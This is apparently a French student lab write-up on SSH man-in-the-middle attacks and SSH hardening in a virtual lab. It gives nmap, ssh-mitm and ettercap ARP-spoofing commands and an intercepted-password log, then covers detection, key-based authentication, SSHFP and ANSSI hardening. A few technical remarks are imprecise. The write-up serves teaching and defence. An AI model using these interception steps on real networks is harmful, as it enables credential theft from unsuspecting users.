🔐 TP SSH – Sécurité, Attaque MITM et Durcissement

1. Introduction et objectifs

Ce TP avait pour but de comprendre les faiblesses du protocole SSH face aux attaques de type MITM (Man-In-The-Middle), puis de mettre en place des contre-mesures efficaces.

L'infrastructure simulée comprend quatre machines virtuelles :

  • srvssh : serveur SSH + serveur DNS
  • clissh : client légitime
  • kali : attaquant
  • rwbsd : routeur (passerelle par défaut)

Objectifs pédagogiques :

  1. Configurer un réseau host-only avec VirtualBox.
  2. Scanner un réseau et découvrir les services avec Nmap.
  3. Comprendre le principe de l'attaque MITM (ARP spoofing + redirection de ports).
  4. Intercepter des identifiants SSH en clair avec ssh-mitm.
  5. Comprendre l'avertissement de changement de clé d'hôte.
  6. Mettre en place l'authentification par clé publique.
  7. Désactiver l'authentification par mot de passe.
  8. Utiliser les enregistrements SSHFP dans le DNS pour vérifier automatiquement les clés d'hôte.
  9. Appliquer les recommandations de durcissement SSH de l'ANSSI.

2. Mise en place de l'infrastructure virtuelle

2.1 Importation des VM

Le fichier tpSSH-Certa.ova a été téléchargé puis importé dans VirtualBox :

VirtualBox → Fichier → Importer un appareil virtuel

Les quatre machines suivantes ont été importées :

MachineRôle
srvsshServeur SSH + DNS
clissh Client SSH
kali Attaquant (outils de penetration test)
rwbsd Routeur / passerelle

2.2 Configuration du réseau host-only

Un réseau host-only nommé vboxnet0 a été configuré :

VirtualBox → Fichier → Gestionnaire de réseau hôte

Paramètres :

  • Adresse IP : 192.168.56.1/24
  • DHCP : désactivé (les IPs sont statiques)

Toutes les VM ont été configurées pour utiliser vboxnet0 comme interface réseau principale.

2.3 Plan d'adressage IP

Chaque VM a reçu une adresse IP statique :

MachineAdresse IP
srvssh 192.168.56.10
clissh 192.168.56.11
kali 192.168.56.12
rwbsd 192.168.56.254

2.4 Test de connectivité

Depuis clissh, tentative de connexion SSH au serveur :

ssh etusio@192.168.56.10
⚠️ Message d'avertissement :
The authenticity of host 'srvssh.local.sio.fr (192.168.56.10)' can't be established.
ECDSA key fingerprint is SHA256:lPIxEKxsYHPP3i7iMiZZXLYUoW9viLwSfF39MNoWlM4.
Are you sure you want to continue connecting (yes/no)?

Explication : Le client n'a jamais rencontré ce serveur. Aucune clé d'hôte n'est présente dans known_hosts. SSH ne peut donc pas vérifier l'identité du serveur.

Emplacement du fichier known_hosts :

/home/etusio/.ssh/known_hosts

Pour les besoins du TP, ce fichier a été vidé :

echo > ~/.ssh/known_hosts

3. Découverte du réseau et des services

Depuis la machine kali (l'attaquant), nous avons utilisé nmap pour découvrir les machines présentes sur le réseau et les services qu'elles exposent.

3.1 Découverte des hôtes

nmap -sP 192.168.56.0/24
✅ Cette commande (ping scan) a révélé toutes les machines actives sur le réseau : srvssh, clissh, rwbsd et kali elle-même.

3.2 Scan des services

nmap -sV 192.168.56.10 # srvssh nmap -sV 192.168.56.11 # clissh nmap -sV 192.168.56.254 # rwbsd

Résultats constatés :

  • srvssh : port 22 (SSH) ouvert
  • clissh : pas de service particulier
  • rwbsd : probablement aucun service SSH
✅ L'attaquant identifie une cible intéressante : le serveur SSH sur 192.168.56.10.

4. Mise en place de l'attaque MITM

L'attaque MITM (Man-In-The-Middle) consiste à s'interposer entre le client et le serveur pour :

  1. Tromper leurs tables ARP (ARP spoofing)
  2. Intercepter, lire et relayer les paquets
  3. Détourner le flux SSH pour voler les identifiants

4.1 Installation de ssh-mitm sur Kali

ssh-mitm est un outil qui intercepte les connexions SSH en se faisant passer pour le serveur légitime.

git clone https://github.com/ktux/ssh-mitm cd ssh-mitm/ export LANG=en_US.utf-8 sudo ./install.sh

Pendant l'installation, nous avons accepté la configuration d'AppArmor pour restreindre les droits du processus ssh-mitm (bonne pratique de sécurité).

4.2 Lancement de ssh-mitm

sudo ./start.sh

Ce script active automatiquement :

  • Le routage IP (forwarding) sur Kali
  • Une redirection de port : toute connexion destinée au port 22 est redirigée vers le port 2222, où écoute ssh-mitm

La règle iptables créée est équivalente à :

iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

4.3 ARP spoofing avec Ettercap

Pour que tout le trafic entre clissh et srvssh passe par Kali, nous empoisonnons les tables ARP.

sudo ettercap -i eth0 -T -M arp:remote /192.168.56.10// /192.168.56.11//
  • -i eth0 : interface réseau
  • -T : mode texte
  • -M arp:remote : attaque ARP spoofing
  • /192.168.56.10// : cible 1 (serveur)
  • /192.168.56.11// : cible 2 (client)
Résultat : Kali annonce au client qu'il est le serveur, et au serveur qu'il est le client. Tous les paquets transitent donc par Kali.

Vérification de l'attaque

Vérification du cache ARP (client ou serveur) :

ip neigh show
✅ On observe que l'adresse MAC associée à l'autre machine a changé : elle correspond désormais à celle de Kali.

4.4 Interception des identifiants

Lorsque l'utilisateur légitime (sur clissh) tente de se connecter :

ssh etusio@192.168.56.10

Le message classique du fingerprint inconnu s'affiche (car le known_hosts a été vidé). L'utilisateur accepte, puis tape son mot de passe.

Sur Kali, ssh-mitm enregistre précieusement :

  • Le login et le mot de passe dans /var/log/auth.log :
Nov 7 14:11:49 kali sshd_mitm[1160]: INTERCEPTED PASSWORD: hostname: [192.168.56.10]; username: [etusio]; password: [Fghijkl1234*] [preauth]
  • Toutes les commandes tapées pendant la session dans /home/ssh-mitm/shell_session_0.txt :
Time : 2025-11-07 13:11:49 GMT Server : 192.168.56.10:22 Client : 192.168.56.11:36486 Username : etusio Password : Fghijkl1234* ...
✅ L'attaque est une réussite : l'attaquant possède désormais les identifiants de l'utilisateur etusio.

5. Détection de l'attaque par le client

Après l'attaque, nous avons vidé le cache ARP sur clissh pour effacer l'empoisonnement, puis tenté une nouvelle connexion :

sudo ip neigh flush all ssh etusio@192.168.56.10
⚠️ Avertissement :
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.

Explication :

  • Le client avait enregistré la clé du véritable serveur lors de la première connexion (malgré l'attaque, c'était la vraie clé).
  • Lors de la seconde tentative, l'attaquant (ssh-mitm) présente sa propre clé (car il termine la connexion TLS/SSH).
  • Le client compare la clé reçue avec celle stockée dans known_hosts : elles sont différentes.
  • SSH en déduit qu'une attaque MITM est potentiellement en cours et refuse la connexion.
✅ Ce mécanisme est la protection par défaut contre les attaques MITM sur SSH. Malheureusement, si l'utilisateur n'a jamais accepté la vraie clé auparavant (cas de la première connexion), l'avertissement n'apparaît pas et l'attaque réussit.

6. Sécurisation du serveur SSH

6.1 Authentification par clé publique

L'authentification par clé publique supprime le besoin de taper un mot de passe à chaque connexion, rendant l'attaque MITM inefficace pour voler des identifiants (pas de mot de passe à intercepter).

Sur le serveur (srvssh) : activation des clés publiques

Édition de /etc/ssh/sshd_config :

sudoedit /etc/ssh/sshd_config

Décommenter / ajouter :

PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys

Redémarrage du service :

sudo service ssh restart

Sur le client (clissh) : génération d'une paire de clés

ssh-keygen -b 256 -t ecdsa

Passphrase utilisée (pour le TP) : TPMITMcerta

Envoi de la clé publique au serveur

ssh-copy-id -i ~/.ssh/id_ecdsa.pub etusio@192.168.56.10
✅ Après cette opération, la connexion s'effectue sans mot de passe (juste la passphrase de la clé privée, ou pas de passphrase si on l'a laissée vide).

6.2 Désactivation de l'authentification par mot de passe

Sur le serveur (srvssh), modification de /etc/ssh/sshd_config :

PasswordAuthentication no

Puis :

sudo service ssh restart
✅ Désormais, l'attaquant ne peut plus voler de mot de passe, car l'authentification par mot de passe est tout simplement désactivée. Seuls ceux qui possèdent la clé privée peuvent se connecter.

6.3 Renforcement avec DNS SSHFP

Les enregistrements SSHFP (SSH Fingerprint) dans le DNS permettent au client de vérifier automatiquement la clé d'hôte du serveur sans dépendre du known_hosts.

Sur le serveur : génération des empreintes

sudo ssh-keygen -r srvssh

Cette commande produit des lignes au format :

srvssh IN SSHFP 1 1 1234567890ABCDEF... srvssh IN SSHFP 2 1 67890ABCDEF12345...

Ajout dans la zone DNS

Fichier /var/named/db.local.sio.fr :

$ORIGIN local.sio.fr. srvssh IN A 192.168.56.10 IN SSHFP 1 1 1234567890ABCDEF... IN SSHFP 2 1 67890ABCDEF12345...

Rechargement de Bind9 :

sudo service bind9 reload

Côté client : vérification automatique

ssh -o VerifyHostKeyDNS=true etusio@192.168.56.10
✅ Le client interroge le DNS, récupère les empreintes SSHFP, les compare avec la clé reçue et accepte automatiquement la connexion sans aucun avertissement (si tout est cohérent).

Avantage : Même si known_hosts est vide, le client peut vérifier la clé du serveur via une source fiable (DNS, si celui-ci est sécurisé). En entreprise, cela évite les demandes d'acceptation de clé manuelles.

6.4 Durcissement complet selon l'ANSSI

L'ANSSI (Agence Nationale de la Sécurité des Systèmes d'Information) publie des recommandations pour la configuration sécurisée de SSH. Nous avons appliqué les plus importantes dans /etc/ssh/sshd_config :

DirectiveValeurExplication
PermitRootLogin no Interdit la connexion directe de root (privilège à prendre via su ou sudo)
Protocol 2 N'utilise que la version 2 du protocole (la version 1 est vulnérable) Port 222 Change le port SSH par défaut (réduit le bruit des scanners automatiques) AllowUsers etusio Seul l'utilisateur etusio peut se connecter (moins de surface d'attaque) PermitEmptyPasswords no Interdit les comptes sans mot de passe (redondant avec PasswordAuthentication no) MaxAuthTries 3 Limite à 3 tentatives d'authentification avant déconnexion (ralentit le brute force) Sandbox yes Active un environnement restreint avant authentification (réduit l'exposition) PrintLastLog yes Affiche la date de la dernière connexion (alerte l'utilisateur en cas d'intrusion)
sudo service ssh restart
⚠️ Remarque : Après avoir changé le port de 22 à 222, les clients doivent désormais se connecter avec :
ssh -p 222 etusio@192.168.56.10

7. Problèmes rencontrés et solutions

ProblèmeCauseSolution
Impossible de se connecter en SSH après importation des VM Les VM n'ont pas la bonne configuration réseau ou le serveur SSH n'est pas démarré Vérifier que toutes les VM sont sur le même réseau host-only et que ssh est actif (systemctl status ssh)
Le client détecte un changement de clé après la première connexion légitime C'est normal : la clé du serveur s'est effectivement enregistrée dans known_hosts Utiliser ce mécanisme pour comprendre la protection contre MITM. Effacer known_hosts pour simuler une première connexion
ssh-mitm plante pendant l'installation (locale fr) Problème de locale (UTF-8) Exécuter export LANG=en_US.utf-8 avant ./install.sh
Après désactivation du mot de passe, plus personne ne peut se connecter La clé publique n'a pas été correctement copiée dans authorized_keys Se connecter en local sur srvssh (depuis VirtualBox) et vérifier /home/etusio/.ssh/authorized_keys
Le client n'utilise pas le DNS pour vérifier SSHFP L'option VerifyHostKeyDNS est false par défaut Utiliser ssh -o VerifyHostKeyDNS=true ou ajouter la directive dans ~/.ssh/config

8. Conclusion

Ce TP a couvert l'ensemble du cycle de vie d'une attaque MITM sur SSH, de la découverte réseau à l'interception d'identifiants, en passant par la détection et le durcissement.

Ce que nous avons appris :

  1. Configuration réseau : Mise en place d'un réseau host-only VirtualBox avec adressage statique.
  2. Scan et découverte : Utilisation de Nmap pour cartographier un réseau et identifier les services vulnérables.
  3. Attaque MITM avec ARP spoofing : Empoisonnement des tables ARP avec Ettercap, redirection des connexions SSH avec ssh-mitm, interception des identifiants et des commandes.
  4. Protection contre le MITM : Le mécanisme known_hosts détecte un changement de clé d'hôte et alerte l'utilisateur.
  5. Authentification par clé publique : Suppression du mot de passe, rendant l'attaque MITM inefficace pour le vol d'identifiants.
  6. Vérification DNS (SSHFP) : Utilisation des enregistrements DNS pour authentifier automatiquement les clés d'hôte (sans known_hosts local).
  7. Durcissement ANSSI : Application des bonnes pratiques (port non standard, limitation des utilisateurs, sandbox, etc.).

Points clés à retenir pour l'avenir :

  • Toujours vérifier les fingerprints lors d'une première connexion SSH (ne jamais accepter aveuglément).
  • Privilégier l'authentification par clé publique et désactiver le mot de passe.
  • Utiliser SSHFP dans le DNS dans les environnements où l'on contrôle le DNS (évite de gérer manuellement known_hosts).
  • Changer le port SSH n'est pas une sécurité en soi (un port scan le découvre), mais cela réduit le bruit des attaques automatisées.
  • Les attaques MITM réelles existent (sur Wi-Fi public, réseau d'entreprise compromis, etc.). La vigilance et les bonnes configurations sont essentielles.
